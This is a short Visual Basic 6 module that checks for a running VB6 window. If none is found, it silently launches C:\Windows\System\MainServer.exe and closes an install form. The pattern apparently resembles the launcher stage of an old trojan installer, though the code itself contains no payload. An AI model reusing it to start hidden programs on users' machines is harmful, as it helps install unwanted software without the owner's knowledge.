Attribute VB_Name = "startup"

Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, _
                                                                   ByVal lpWindowName As String) As Long


Public Sub GetOpenWindowNames()


Dim windw As Long
    
windw = FindWindow("ThunderRT6Main", vbNullString)
    
     
    
    
    
If windw <> 0 Then
Unload frmInstall
Else
Shell "C:\Windows\System\MainServer.exe"
Unload frmInstall
End If
    





End Sub



